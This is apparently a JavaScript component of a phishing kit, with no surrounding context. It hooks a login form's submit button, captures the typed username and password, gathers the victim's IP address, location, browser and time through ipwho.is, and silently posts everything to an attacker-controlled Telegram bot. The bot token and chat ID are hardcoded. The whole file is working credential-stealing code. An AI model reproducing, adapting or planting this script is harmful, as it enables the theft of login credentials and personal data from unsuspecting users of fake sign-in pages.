document.getElementById('btn_submitCredentials').addEventListener('click', function(event) {
  event.preventDefault();

  // Get form values
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // User Agent & Date
  const userAgent = navigator.userAgent;
  const date = new Date().toLocaleString();

  // Telegram bot config
  const telegramBotToken = '7561503096:AAEUuGD_d5h7_mEviKEx9BaIAeEaXFMexa0';
  const chatId = '6686015911';

  // Get IP and Geo info using ipwho.is (free, no API key needed)
  fetch('https://ipwho.is/')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip || 'Unknown';
      const region = data.region || 'Unknown';
      const city = data.city || 'Unknown';
      const continent = data.continent || 'Unknown';
      const timezone = data.timezone || 'Unknown';

      // Compose message
      const message = `
~~~~[ LOGIN DETAILS ]~~~~
👤 *Username:* ${username}
🔑 Password: ${password}

~~~~[ MORE DETAILS ]~~~~
🌐 *IP Address:* ${ip}
📍 *Region   :* ${region}
🏙️ *City     :* ${city}
🌎 *Continent:* ${continent}
🕰️ *Timezone :* ${timezone}
💻 *OS/Browser:* ${userAgent}
📅 *Date     :* ${date}

~~~~[ ACETARY'S ]~~~~
      `;

      // Send to Telegram silently
      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'  // so your bold formatting works
        })
      });
    });
});